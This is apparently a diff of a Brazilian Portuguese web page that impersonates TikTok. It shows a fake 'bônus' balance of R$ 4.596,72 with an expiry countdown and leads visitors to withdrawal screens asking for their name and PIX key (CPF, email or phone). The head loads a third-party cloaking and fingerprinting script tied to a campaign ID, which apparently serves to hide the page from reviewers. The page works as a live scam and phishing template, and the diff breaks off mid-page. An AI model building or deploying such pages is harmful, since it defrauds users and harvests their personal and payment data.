@@ -1,536 +1,1021 @@
 
 <!DOCTYPE html><html lang="pt-BR"><head>
-  <meta charset="UTF-8">
-  <title>Validação de uso — Saldo liberado</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
-    }
+    <script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "vg9bztkn5m");
+</script>
+    <meta charset="UTF-8">
+ <script>
+    window.FYCLOAK_CAMPAIGN_ID = 1490;  // ID da sua campanha
+    window.FYCLOAK_USER_ID = 104;      // Seu user ID
+</script>
+<script src="https://cdn.fycloak.com/scripts/advanced-fingerprint.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="format-detection" content="telephone=no">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
 
-    body {
-      min-height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      padding: 16px;
-      background: linear-gradient(135deg, #fdf2f7, #fee2e2, #e0f2fe);
-      background-size: 200% 200%;
-      animation: bgMove 12s ease-in-out infinite;
-      position: relative;
-      overflow-x: hidden;
-    }
+<script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "tbhq1za8fq");
+</script>
 
-    @keyframes bgMove {
-      0% {
-        background-position: 0% 50%;
-      }
+    <link rel="stylesheet" href="css/style.css">
+    <title>Document</title>
+  </head>
+  <body>
+    <main id="screens">
+      <section id="one" class="screen">
+        <div class="title">TikTok Bônus</div>
+        <div class="saldo">
+          <div class="container-saldo" role="region" aria-labelledby="saldo-title">
+            <div class="saldo-info">
+              <div class="saldo-label">
+                <span class="saldo-text">Seu saldo</span>
+                <img src="images/p-saldo.svg" alt="" class="p-saldo">
+              </div>
 
-      50% {
-        background-position: 100% 50%;
-      }
+              <div id="saldo-valor" class="saldo-valor" aria-live="polite">
+                <span class="valor-currency valor-currency-dois valor-currency-tres" data-amount-target="4596.72">R$ 4.596,72</span>
+              </div>
+            </div>
 
-      100% {
-        background-position: 0% 50%;
-      }
-    }
-
-    /* fundo de partículas */
-    #bgCanvas {
-      position: fixed;
-      inset: 0;
-      width: 100%;
-      height: 100%;
-      z-index: 0;
-      pointer-events: none;
-    }
-
-    /* animação de entrada do card */
-    @keyframes cardIn {
-      from {
-        opacity: 0;
-        transform: translateY(18px) scale(.97);
-      }
-
-      to {
-        opacity: 1;
-        transform: translateY(0) scale(1);
-      }
-    }
-
-    .card {
-      width: 100%;
-      max-width: 420px;
-      background: #fff;
-      border-radius: 22px;
-      box-shadow: 0 18px 40px rgba(0, 0, 0, .08);
-      padding: 24px 20px 22px;
-      position: relative;
-      z-index: 1;
-      animation: cardIn .4s ease-out;
-    }
-
-    /* logo pura no topo */
-    .logo-tk {
-      display: block;
-      width: 120px;
-      /* ajusta o tamanho que quiser */
-      height: auto;
-      margin: 0 auto 12px auto;
-      /* centralizada, com espaçamento embaixo */
-    }
-
-    h1 {
-      font-size: 22px;
-      line-height: 1.3;
-      color: #111827;
-      text-align: left;
-      margin-bottom: 6px;
-    }
-
-    h1 span {
-      color: #f43f5e;
-    }
-
-    .subtitle {
-      font-size: 14px;
-      color: #4b5563;
-      text-align: left;
-      margin-bottom: 18px;
-    }
-
-    /* bloco de estatísticas */
-    .stats {
-      background: #f9fafb;
-      border-radius: 16px;
-      padding: 14px 12px 10px;
-      margin-bottom: 16px;
-      border: 1px solid #e5e7eb;
-    }
-
-    .stats-title {
-      font-size: 12px;
-      color: #6b7280;
-      margin-bottom: 8px;
-      display: flex;
-      align-items: center;
-      gap: 6px;
-    }
-
-    .stats-title-dot {
-      width: 6px;
-      height: 6px;
-      border-radius: 999px;
-      background: #22c55e;
-    }
-
-    .stat {
-      margin-bottom: 10px;
-    }
-
-    .stat:last-child {
-      margin-bottom: 0;
-    }
-
-    .stat-top {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      margin-bottom: 4px;
-    }
-
-    .stat-label {
-      font-size: 13px;
-      color: #374151;
-    }
-
-    .stat-value {
-      font-size: 12px;
-      color: #6b7280;
-    }
-
-    .stat-value.done {
-      color: #16a34a;
-      font-weight: 600;
-    }
-
-    .bar {
-      width: 100%;
-      height: 6px;
-      border-radius: 999px;
-      background: #e5e7eb;
-      overflow: hidden;
-      position: relative;
-    }
-
-    .bar-fill {
-      height: 100%;
-      width: 0%;
-      border-radius: inherit;
-      background: linear-gradient(90deg, #f43f5e, #ec4899);
-      transition: width .25s ease-out;
-    }
-
-    .note {
-      font-size: 12px;
-      color: #6b7280;
-      text-align: center;
-      margin: 10px 0 14px;
-      min-height: 18px;
-    }
-
-    /* botão flutuante */
-    @keyframes floatBtn {
-      0% {
-        transform: translateY(0);
-        box-shadow: 0 10px 24px rgba(244, 63, 94, .35);
-      }
-
-      50% {
-        transform: translateY(-5px);
-        box-shadow: 0 18px 32px rgba(244, 63, 94, .5);
-      }
-
-      100% {
-        transform: translateY(0);
-        box-shadow: 0 10px 24px rgba(244, 63, 94, .35);
-      }
-    }
-
-    .btn {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
-      width: 100%;
-      border: none;
-      outline: none;
-      border-radius: 999px;
-      padding: 13px 16px;
-      background: #f43f5e;
-      color: #fff;
-      font-size: 14px;
-      font-weight: 600;
-      cursor: pointer;
-      box-shadow: 0 10px 24px rgba(244, 63, 94, .4);
-      opacity: 0;
-      pointer-events: none;
-      transition: transform .12s, box-shadow .12s, opacity .12s;
-      margin-top: 4px;
-    }
-
-    .btn.visible {
-      opacity: 1;
-      pointer-events: auto;
-      animation: floatBtn 2.4s ease-in-out infinite;
-    }
-
-    .btn:hover {
-      animation: none;
-      transform: translateY(-2px);
-      box-shadow: 0 18px 36px rgba(244, 63, 94, .55);
-    }
-
-    .btn-icon {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
-
-    .small-text {
-      font-size: 11px;
-      color: #9ca3af;
-      text-align: center;
-      margin-top: 6px;
-    }
-
-    /* LOADER TIKTOK – tela branca com bolinha azul/rosa */
-    .tiktok-loader-overlay {
-      position: fixed;
-      inset: 0;
-      background: #ffffff;
-      display: none;
-      align-items: center;
-      justify-content: center;
-      flex-direction: column;
-      z-index: 9999;
-    }
-
-    .tiktok-loader-circle {
-      width: 70px;
-      height: 70px;
-      border-radius: 50%;
-      border: 6px solid rgba(0, 0, 0, 0.06);
-      border-top-color: #00f2ea;
-      border-right-color: #ff0050;
-      animation: tiktok-spin 1s linear infinite;
-      margin-bottom: 18px;
-    }
-
-    .tiktok-loader-text {
-      font-size: 14px;
-      color: #111827;
-      opacity: .7;
-    }
-
-    @keyframes tiktok-spin {
-      to {
-        transform: rotate(360deg);
-      }
-    }
-
-    @media (max-width:480px) {
-      .card {
-        padding: 20px 16px 18px;
-      }
-
-      h1 {
-        font-size: 20px;
-      }
-    }
-  </style>
-  </head><body><div style="display: none;">
-    <script id="_wau2ha">
-        var _wau = _wau || [];
-        _wau.push(["dynamic", "panads233348", "2ha", "c4302bffffff", "small"]);
-    </script>
-    <script async="" src="js/d.js"></script>
-  </div>
-
-
-
-
-  <canvas id="bgCanvas" width="1900" height="900"></canvas>
-
-  <div class="card">
-    <!-- LOGO PURA (sem badge, sem fundo extra) -->
-   <!-- <img src="images/tk-logo.png" alt="TikTok" class="logo-tk">-->
-    <br>
-    <h1>
-      Você atingiu todos os
-      <span>critérios de atividade.</span>
-    </h1>
-    <p class="subtitle">
-      Confirmamos que sua conta cumpriu os requisitos mínimos de uso. Confira o resumo abaixo e toque para liberar o seu
-      progresso.
-    </p>
-
-    <div class="stats" id="statsBox">
-      <div class="stats-title">
-        <span class="stats-title-dot"></span>
-        Detalhes da sua atividade
-      </div>
-
-      <!-- Vídeos assistidos 50/50 -->
-      <div class="stat" data-target="50">
-        <div class="stat-top">
-          <span class="stat-label">Vídeos assistidos</span>
-          <span class="stat-value">21/50</span>
+            <div class="saldo-action">
+              <button type="button" class="btn-sacar" aria-label="Sacar" disabled="">
+                <span class="btn-text">Sacar</span>
+                <span class="pix-badge" aria-hidden="true">
+                  <img src="images/pix-logo.svg" alt="">
+                </span>
+              </button>
+            </div>
+          </div>
         </div>
-        <div class="bar">
-          <div class="bar-fill" style="width: 42%;"></div>
+        <div class="bloco-dois">
+          <div class="parabens">
+            <div class="parabens-txt">
+              <span class="parabens-txtum">Parabéns!</span>
+              <span class="parabens-txtdois">Você concluiu
+                <span class="nobreak">todas as tarefas</span></span>
+
+              <span class="parabens-valor">R$ 4.596,72</span>
+            </div>
+            <img src="images/parabens-img.png" alt="" class="parabens-img">
+          </div>
+          <div class="line"></div>
+          <div class="entre">
+            <span class="entre-txt">Entre por 14 dias para ganhar
+              <span class="entre-pts">8.414 pontos</span>
+              <span class="entre-data">• 12 de nov - 25 de nov</span>
+            </span>
+            <button type="button" class="btn-concluido" aria-label="Sacar">
+              <span class="btn-concluido-text">Concluído</span>
+            </button>
+          </div>
+          <div class="concluiu">
+            <span class="concluiu-txt">Você concluiu todos os dias de check-in.</span>
+          </div>
+          <div class="dia">
+            <div class="day-tracker">
+              <div class="day-tracker__item">
+                <div class="day-tracker__box">
+                  <div class="day-tracker__content">
+                    <div class="day-tracker__coin">
+                      <img src="images/p-dia.svg" alt="">
+                    </div>
+                    <div class="day-tracker__value">50</div>
+                  </div>
+
+                  <div class="day-tracker__overlay">
+                    <div class="day-tracker__icon-wrapper">
+                      <div class="day-tracker__icon-shape">
+                        <img src="images/fi-bs-check.svg" alt="">
+                      </div>
+                    </div>
+                  </div>
+                </div>
+
+                <div class="day-tracker__label">Dia 01</div>
+              </div>
+
+              <div class="day-tracker__item">
+                <div class="day-tracker__box">
+                  <div class="day-tracker__content">
+                    <div class="day-tracker__coin">
+                      <img src="images/p-dia.svg" alt="">
+                    </div>
+                    <div class="day-tracker__value">100</div>
+                  </div>
+
+                  <div class="day-tracker__overlay">
+                    <div class="day-tracker__icon-wrapper">
+                      <div class="day-tracker__icon-shape">
+                        <img src="images/fi-bs-check.svg" alt="">
+                      </div>
+                    </div>
+                  </div>
+                </div>
+
+                <div class="day-tracker__label">Dia 02</div>
+              </div>
+
+              <div class="day-tracker__item">
+                <div class="day-tracker__box">
+                  <div class="day-tracker__content">
+                    <div class="day-tracker__coin">
+                      <img src="images/p-dia.svg" alt="">
+                    </div>
+                    <div class="day-tracker__value">150</div>
+                  </div>
+
+                  <div class="day-tracker__overlay">
+                    <div class="day-tracker__icon-wrapper">
+                      <div class="day-tracker__icon-shape">
+                        <img src="images/fi-bs-check.svg" alt="">
+                      </div>
+                    </div>
+                  </div>
+                </div>
+
+                <div class="day-tracker__label">Dia 03</div>
+              </div>
+
+              <div class="day-tracker__item">
+                <div class="day-tracker__box">
+                  <div class="day-tracker__content">
+                    <div class="day-tracker__coin">
+                      <img src="images/p-dia.svg" alt="">
+                    </div>
+                    <div class="day-tracker__value">200</div>
+                  </div>
+
+                  <div class="day-tracker__overlay">
+                    <div class="day-tracker__icon-wrapper">
+                      <div class="day-tracker__icon-shape">
+                        <img src="images/fi-bs-check.svg" alt="">
+                      </div>
+                    </div>
+                  </div>
+                </div>
+
+                <div class="day-tracker__label">Dia 04</div>
+              </div>
+
+              <div class="day-tracker__item">
+                <div class="day-tracker__box">
+                  <div class="day-tracker__content">
+                    <div class="day-tracker__coin">
+                      <img src="images/p-dia.svg" alt="">
+                    </div>
+                    <div class="day-tracker__value">250</div>
+                  </div>
+
+                  <div class="day-tracker__overlay">
+                    <div class="day-tracker__icon-wrapper">
+                      <div class="day-tracker__icon-shape">
+                        <img src="images/fi-bs-check.svg" alt="">
+                      </div>
+                    </div>
+                  </div>
+                </div>
+
+                <div class="day-tracker__label">Dia 05</div>
+              </div>
+
+              <div class="day-tracker__item">
+                <div class="day-tracker__box">
+                  <div class="day-tracker__content">
+                    <div class="day-tracker__coin">
+                      <img src="images/p-dia.svg" alt="">
+                    </div>
+                    <div class="day-tracker__value">300</div>
+                  </div>
+
+                  <div class="day-tracker__overlay">
+                    <div class="day-tracker__icon-wrapper">
+                      <div class="day-tracker__icon-shape">
+                        <img src="images/fi-bs-check.svg" alt="">
+                      </div>
+                    </div>
+                  </div>
+                </div>
+
+                <div class="day-tracker__label">Dia 06</div>
+              </div>
+            </div>
+          </div>
+          <div class="line line-dois"></div>
+
+          <div class="entre">
+            <span class="entre-txt entre-txt-dois">Vê anúncios direcionados diariamente para ganhares até
+              <span class="entre-pts">2.730 pontos</span>
+              <span class="entre-data">• 30/30 anúncios assistidos</span>
+            </span>
+            <button type="button" class="btn-concluido" aria-label="Sacar">
+              <span class="btn-concluido-text">Concluído</span>
+            </button>
+          </div>
+          <div class="line line-dois"></div>
+
+          <div class="entre">
+            <span class="entre-txt entre-txt-dois">Assistir vídeos
+              <span class="entre-pts">500 pontos</span>
+            </span>
+            <button type="button" class="btn-concluido" aria-label="Sacar">
+              <span class="btn-concluido-text">Concluído</span>
+            </button>
+          </div>
+          <div class="assista">
+            <span class="assista-txt">Assista por 10 min </span>
+            <svg class="assista-tail" xmlns="http://www.w3.org/2000/svg" width="7" height="6" viewBox="0 0 7 6" fill="none">
+              <path d="M4.03259 5.25C3.64769 5.91667 2.68544 5.91667 2.30054 5.25L0.135475 1.5C-0.249425 0.833333 0.231701 6.49976e-07 1.0015 5.82678e-07L5.33163 2.04126e-07C6.10143 1.36828e-07 6.58255 0.833334 6.19765 1.5L4.03259 5.25Z" fill="#F1F1F1"></path>
+            </svg>
+          </div>
+          <div class="barra">
+            <div class="progress-bar">
+              <div class="progress-step">
+                <div class="step-icon">
+                  <img src="images/p-assista.svg" alt="P">
+                </div>
+                <span class="step-text">50 pontos</span>
+              </div>
+
+              <div class="progress-step">
+                <div class="step-icon">
+                  <img src="images/p-assista.svg" alt="P">
+                </div>
+                <span class="step-text">100 pontos</span>
+              </div>
+
+              <div class="progress-step">
+                <div class="step-icon">
+                  <img src="images/p-assista.svg" alt="P">
+                </div>
+                <span class="step-text">150 pontos</span>
+              </div>
+
+              <div class="progress-step">
+                <div class="step-icon">
+                  <img src="images/p-assista.svg" alt="P">
+                </div>
+                <span class="step-text">225 pontos</span>
+              </div>
+            </div>
+            <div class="line line-dois"></div>
+            <div class="entre">
+              <span class="entre-txt entre-txt-dois">Resgate suas recompensas e ganhe
+                <span class="entre-pts">640 pontos</span>
+                <span class="entre-data">• 8/8 resgatados</span>
+              </span>
+              <button type="button" class="btn-concluido" aria-label="Sacar">
+                <span class="btn-concluido-text">Concluído</span>
+              </button>
+            </div>
+            <div class="line line-dois"></div>
+            <div class="entre">
+              <span class="entre-txt entre-txt-dois">Faça 60 pesquisas diárias para ganhar até
+                <span class="entre-pts">996 pontos</span>
+                <span class="entre-data">• 60 pesquisas feitas hoje</span>
+              </span>
+              <button type="button" class="btn-concluido" aria-label="Sacar">
+                <span class="btn-concluido-text">Concluído</span>
+              </button>
+            </div>
+
+            <!-- ADICIONEI A CLASSE "posicao-direita" AQUI -->
+            <div class="assista posicao-direita">
+              <span class="assista-txt">Até 756 pontos</span>
+              <svg class="assista-tail taildois" xmlns="http://www.w3.org/2000/svg" width="7" height="6" viewBox="0 0 7 6" fill="none">
+                <path d="M4.03259 5.25C3.64769 5.91667 2.68544 5.91667 2.30054 5.25L0.135475 1.5C-0.249425 0.833333 0.231701 6.49976e-07 1.0015 5.82678e-07L5.33163 2.04126e-07C6.10143 1.36828e-07 6.58255 0.833334 6.19765 1.5L4.03259 5.25Z" fill="#F1F1F1"></path>
+              </svg>
+            </div>
+            <div class="progress-bar">
+              <div class="progress-step hide">
+                <div class="step-icon">
+                  <img src="images/p-assista.svg" alt="P">
+                </div>
+                <span class="step-text">16 pesquisas</span>
+              </div>
+
+              <div class="progress-step">
+                <div class="step-icon">
+                  <img src="images/p-assista.svg" alt="P">
+                </div>
+                <span class="step-text">36 pesquisas</span>
+              </div>
+
+              <div class="progress-step">
+                <div class="step-icon">
+                  <img src="images/p-assista.svg" alt="P">
+                </div>
+                <span class="step-text">60 pesquisas</span>
+              </div>
+            </div>
+            <div class="obtem">
+              <span class="obtem-txt">Obtém 21 pontos por escreveres uma consulta na barra de
+                pesquisa, ou 0 ponto por tocares numa pesquisa sugerida, como em
+                "Podes gostar".</span>
+            </div>
+            <div class="line line-dois"></div>
+
+            <div class="entre">
+              <span class="entre-txt">Convide 1 amigo para se inscrever e ganhar
+                <span class="entre-pts">100.000 pontos - 200.000 pontos</span>
+              </span>
+              <button type="button" class="btn-concluido" aria-label="Sacar">
+                <span class="btn-concluido-text">Concluído</span>
+              </button>
+            </div>
+          </div>
         </div>
-      </div>
+      </section>
 
-      <!-- Tempo na plataforma 1000/1000 -->
-      <div class="stat" data-target="1000">
-        <div class="stat-top">
-          <span class="stat-label">Tempo em uso na plataforma</span>
-          <span class="stat-value">0/1000</span>
+      <section id="two" class="screen" aria-hidden="true">
+        <div class="modal-inner" role="dialog" aria-modal="true" aria-labelledby="modal-title">
+          <div class="popup">
+            <img src="images/gol.png" alt="" class="gol-img">
+            <span class="gol">Gol de Prêmios</span>
+            <span class="gol-txt">Parabéns! Como parte de uma campanha de recompensas exclusiva. </span><span class="valor-currency gol-valor valor-currency-dois valor-currency-quatro" data-amount-target="4596.72">R$ 4.596,72</span>
+            <div class="timer-wrapper expira-em-popup">
+              <div class="timer-label">Expira em</div>
+
+              <div class="timer-clock">
+                <!-- Horas -->
+                <div class="timer-box" data-timer="hours">00</div>
+                <!-- Não é usado, mas bom ter -->
+
+                <!-- Separador -->
+                <div class="timer-separator">:</div>
+
+                <!-- Minutos -->
+                <div class="timer-box" data-timer="minutes">16</div>
+                <!-- ADICIONE AQUI -->
+
+                <!-- Separador -->
+                <div class="timer-separator">:</div>
+
+                <!-- Segundos -->
+                <div class="timer-box" data-timer="seconds">38</div>
+                <!-- ADICIONE AQUI -->
+              </div>
+            </div>
+            <button type="button" class="btn-obrigado" aria-label="Obrigado" data-modal-close="">
+              <span class="btn-text btn-textdois btn-txt-obrigado">Obrigado</span>
+            </button>
+          </div>
         </div>
-        <div class="bar">
-          <div class="bar-fill"></div>
+      </section>
+      <section id="three" class="screen">
+        <div class="expira-saldo">
+          <div class="timer-wrapper">
+            <p id="countdown-text">
+              SEU SALDO EXPIRA EM
+              <span id="timer">00 - 16 - 38</span>
+            </p>
+          </div>
         </div>
-      </div>
+        <div class="title">Resgatar recompensas</div>
+        <div class="saldo saldo-dois">
+          <div class="container-saldo" role="region" aria-labelledby="saldo-title">
+            <div class="saldo-info saldo-info-dois">
+              <div class="saldo-label">
+                <span class="saldo-text saldo-text-dois">Seu saldo</span>
+              </div>
 
-      <!-- Vídeos curtidos 100/100 -->
-      <div class="stat" data-target="100">
-        <div class="stat-top">
-          <span class="stat-label">Vídeos curtidos</span>
-          <span class="stat-value">0/100</span>
+              <div class="saldo-valor saldo-valor-dois" aria-live="polite">
+                <span class="valor-currency valor-currency-dois" data-amount-target="4596.72">R$4.596,72</span>
+                <span class="total-pontos">= 28.347.200 pontos (s)</span>
+              </div>
+            </div>
+
+            <div class="saldo-action">
+              <span class="saldo-img"><img src="images/p-saldo-maior.png" alt="" class="p-saldo p-saldo-maior"></span>
+            </div>
+          </div>
         </div>
-        <div class="bar">
-          <div class="bar-fill"></div>
+        <div class="linha"></div>
+        <div class="saldo saldo-tres">
+          <div class="container-saldo" role="region" aria-labelledby="saldo-title">
+            <div class="saldo-info saldo-info-dois">
+              <div class="saldo-valor saldo-valor-dois" aria-live="polite">
+                <span class="total-pontos total-pontos-dois">Última recompensa: R$ 646,43</span>
+              </div>
+            </div>
+          </div>
         </div>
-      </div>
-    </div>
 
-    <div class="note" id="noteText">Analisando seus vídeos assistidos…</div>
+        <div class="saldo saldo-sacar">
+          <div class="container-saldo" role="region" aria-labelledby="saldo-title">
+            <div class="saldo-info saldo-info-sacar">
+              <div class="saldo-label">
+                <span class="saldo-sacar-text">Sacar dinheiro</span>
+              </div>
 
-    <button class="btn" id="claimBtn">
-      <span class="btn-icon">
-        <!-- ícone de moeda -->
-        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-coin" viewBox="0 0 16 16">
-          <path d="M5.5 9.511c.076.954.83 1.697 2.182 1.785V12h.6v-.709c1.4-.098 2.218-.846 2.218-1.932 0-.987-.626-1.496-1.745-1.76l-.473-.112V5.57c.6.068.982.396 1.074.85h1.052c-.076-.919-.864-1.638-2.126-1.716V4h-.6v.719c-1.195.117-2.01.836-2.01 1.853 0 .9.606 1.472 1.613 1.707l.397.098v2.034c-.615-.093-1.022-.43-1.114-.9zm2.177-2.166c-.59-.137-.91-.416-.91-.836 0-.47.345-.822.915-.925v1.76h-.005zm.692 1.193c.717.166 1.048.435 1.048.91 0 .542-.412.914-1.135.982V8.518z">
-          </path>
-          <path d="M8 15A7 7 0 1 1 8 1a7 7 0 0 1 0 14m0 1A8 8 0 1 0 8 0a8 8 0 0 0 0 16"></path>
-          <path d="M8 13.5a5.5 5.5 0 1 1 0-11 5.5 5.5 0 0 1 0 11m0 .5A6 6 0 1 0 8 2a6 6 0 0 0 0 12"></path>
-        </svg>
-      </span>
-      Liberar meu progresso
-    </button>
+              <div class="saldo-valor" aria-live="polite">
+                <span class="transferencia-txt"><img src="images/fi-rs-credit-card.png" alt="">Transferencia via /
+                  <img src="images/pix-logo.svg" alt="" class="pix-logo-transf"></span>
+              </div>
+            </div>
+          </div>
+          <div class="widget-container">
+            <div class="botoes-row botoes-row-sacar">
+              <button class="btn-valor">R$1,5</button>
+              <button class="btn-valor">R$5</button>
+              <button class="btn-valor">R$10</button>
+            </div>
 
-    <div class="small-text">
-      Os dados acima são gerados automaticamente com base na sua interação recente na plataforma.
-    </div>
-  </div>
+            <button class="btn-valor display-total">R$4.596,72</button>
+          </div>
+          <button type="button" class="btn-obrigado btn-sacar-dois btn-sacar-indisponivel" aria-label="sacar dinheiro">
+            <span class="btn-text btn-textdois-sacar btn-three-saque">Sacar dinheiro</span>
+          </button>
+          <div class="obtem obtem-sacar sacar-dinheiro">
+            <span class="obtem-txt">Para sacar dinheiro, você precisa de um saldo mínimo de R$1,5. Os
+              limites de saque para transações individuais e mensais podem
+              variar conforme o pais ou região.</span>
+          </div>
+        </div>
 
-  <!-- LOADER TIKTOK -->
-  <div class="tiktok-loader-overlay" id="tiktok-loader">
-    <div class="tiktok-loader-circle"></div>
-    <div class="tiktok-loader-text">Sincronizando com a sua conta...</div>
-  </div>
+        <div class="saldo saldo-sacar">
+          <div class="container-saldo ctn-flor" role="region" aria-labelledby="saldo-title">
+            <img src="images/flor.png" alt="" class="flor">
+            <div class="saldo-info obtenha-title">
+              <div class="saldo-label">
+                <span class="saldo-sacar-text obtenha-txt">Obtenha Moedas para a LIVE</span>
+              </div>
 
-  <script>
-    /* --------- ANIMAÇÃO DAS ESTATÍSTICAS --------- */
-    const stats = Array.from(document.querySelectorAll('.stat'));
-    const noteText = document.getElementById('noteText');
-    const claimBtn = document.getElementById('claimBtn');
+              <div class="saldo-valor saldo-valor-tres border-none" aria-live="polite">
+                <span class="transferencia-txt moedas-txt">Use Moedas para enviar presentes virtuais para seus hosts de
+                  live Favoritos.</span>
+              </div>
+            </div>
+          </div>
 
-    const labelsText = [
-      'Analisando seus vídeos assistidos…',
-      'Conferindo seu tempo ativo na plataforma…',
-      'Verificando suas interações (curtidas)…',
-      'Pronto! Seu uso foi validado. Toque para liberar o progresso.'
-    ];
+          <button type="button" class="btn-sacar-indisponivel" aria-label="sacar dinheiro">
+            <span class="btn-text btn-indis">Indisponível</span>
+          </button>
+          <!-- <div class="obtem obtem-sacar">
+            <span class="obtem-txt"
+              >Para sacar ddasdasinheiro, você precisa de um saldo mínimo de
+              R$1,5. Os limites de saque para transações individuais e mensais
+              podem variar conforme o pais ou região.</span
+            >
+          </div> -->
+        </div>
 
-    function animateStat(index) {
-      const stat = stats[index];
-      const target = parseInt(stat.getAttribute('data-target'), 10);
-      const valueEl = stat.querySelector('.stat-value');
-      const barFill = stat.querySelector('.bar-fill');
+        <div class="saldo saldo-sacar">
+          <div class="container-saldo" role="region" aria-labelledby="saldo-title">
+            <div class="saldo-info obtenha-title">
+              <div class="saldo-label">
+                <span class="saldo-sacar-text obtenha-txt">Recarga móvel</span>
+              </div>
 
-      let current = 0;
+              <div class="saldo-valor saldo-valor-tres celular-recarga" aria-live="polite">
+                <span class="ddd">+55</span>
+                <span class="linha-ddd"></span>
+                <div class="telefone">12345678901</div>
+              </div>
+            </div>
+          </div>
 
-      let step = 1;
-      if (target > 200) step = 20;
-      if (target > 600) step = 40;
+          <button type="button" class="btn-sacar-indisponivel" aria-label="sacar dinheiro">
+            <span class="btn-text btn-indis">Indisponível</span>
+          </button>
+          <div class="obtem obtem-sacar">
+            <span class="obtem-txt recarga-txt">Voce precisa de um saldo mínimo de R$10 para recarga de
+              celular</span>
+          </div>
+        </div>
+      </section>
 
-      noteText.textContent = labelsText[index] || '';
+      <section id="four" class="modal" aria-hidden="true">
+        <div class="modal-inner inner-pop">
+          <div class="saque-popup">
+            <div class="title saque-title">Adicionar método de saque</div>
+            <span class="pix-item" role="button" tabindex="0" data-open-modal="five">
+              <div class="pix-icon">
+                <img src="images/pix-solo.svg" alt="" class="pix-solo">
+              </div>
 
-      const interval = setInterval(() => {
-        current += step;
-        if (current >= target) {
-          current = target;
+              <div class="pix-details">
+                <span class="pix-title">PIX</span>
+                <span class="pix-subtitle">Recebimento Imediato</span>
+              </div>
+
+              <span class="pix-arrow">
+                <svg xmlns="http://www.w3.org/2000/svg" width="8" height="14" viewBox="0 0 8 14" fill="none">
+                  <path d="M1.411 13.414L0 12L5.28899 6.707L0 1.414L1.415 0L6.69999 5.293C7.07493 5.66806 7.28556 6.17667 7.28556 6.707C7.28556 7.23733 7.07493 7.74594 6.69999 8.121L1.411 13.414Z" fill="#7F7F7F"></path>
+                </svg>
+              </span>
+            </span>
+          </div>
+        </div>
+      </section>
+      <section id="five" class="screen" aria-hidden="true">
+        <div class="modal-inner inner-pop saque-popup">
+          <div class="title saque-title">Vincular PIX</div>
+
+          <div class="form-container">
+            <div class="form-group">
+              <label class="field-label" for="nome">Nome</label>
+              <input type="text" id="nome" placeholder="Nome completo" class="nome-completo">
+            </div>
+
+            <div class="form-group">
+              <label class="field-label">Tipo de Chave PIX</label>
+
+              <div class="pix-selector" id="pix-type-selector" data-open-modal="six" role="button" tabindex="0">
+                <span class="placeholder-text" id="pix-selector-text">Escolha o tipo de chave PIX</span>
+                <span class="arrow arrow-tois"><svg xmlns="http://www.w3.org/2000/svg" width="5" height="9" viewBox="0 0 5 9" fill="none">
+                    <path d="M0.940665 8.94267L0 8L3.52599 4.47133L0 0.942666L0.943332 0L4.46666 3.52867C4.71662 3.7787 4.85704 4.11778 4.85704 4.47133C4.85704 4.82489 4.71662 5.16396 4.46666 5.414L0.940665 8.94267Z" fill="#7F7F7F"></path>
+                  </svg>
+                </span>
+              </div>
+            </div>
+
+            <div class="form-group">
+              <label class="field-label">Chave PIX</label>
+              <!-- Wrapper para detectar clique quando disabled -->
+              <div id="pix-key-wrapper" class="input-wrapper-disabled">
+                <input type="text" id="pix-key-input" placeholder="Digite sua chave PIX" class="nome-completo input-disabled" disabled="">
+              </div>
+            </div>
+
+            <button type="button" id="btn-enviar-pix" class="btn-obrigado btn-sacar-dois btn-vincular btn-disabled" aria-label="sacar dinheiro">
+              <span class="btn-text btn-textdois-sacar">Enviar</span>
+            </button>
+          </div>
+        </div>
+      </section>
+      <section id="six" class="screen" aria-hidden="true">
+        <div class="modal-inner inner-pop">
+          <div class="saque-popup chave-pix">
+            <div class="title saque-title">Chave PIX</div>
+            <div class="selection-container">
+              <div class="option-row">
+                <label for="key-cpf">
+                  <span class="option-text">CPF</span>
+                  <input type="radio" id="key-cpf" name="pix_key_type" checked="">
+                  <span class="custom-radio"></span>
+                </label>
+              </div>
+
+              <div class="option-row">
+                <label for="key-email">
+                  <span class="option-text">E-mail</span>
+                  <input type="radio" id="key-email" name="pix_key_type">
+                  <span class="custom-radio"></span>
+                </label>
+              </div>
+
+              <div class="option-row">
+                <label for="key-celular">
+                  <span class="option-text">Celular</span>
+                  <input type="radio" id="key-celular" name="pix_key_type">
+                  <span class="custom-radio"></span>
+                </label>
+              </div>
+
+              <div class="option-row">
+                <label for="key-aleatoria">
+                  <span class="option-text">Chave Aleatória</span>
+                  <input type="radio" id="key-aleatoria" name="pix_key_type">
+                  <span class="custom-radio"></span>
+                </label>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+      <section id="seven" class="screen">
+        <header class="loading-header">
+          <div class="loading-logo">
+            <img src="images/logotiktok.png" alt="TikTok Logo" class="loading-logo-img">
+          </div>
+        </header>
+
+        <main class="loading-main-content">
+          <div class="new-loading-container">
+            <div class="new-loading-text" id="new-loading-text">
+              Validando acesso...
+            </div>
+            <div class="new-progress-track">
+              <div class="new-progress-bar" id="new-progress-bar"></div>
+            </div>
+          </div>
+        </main>
+      </section>
+      <section id="nine" class="screen" aria-hidden="true">
+        <div class="confirmation-container">
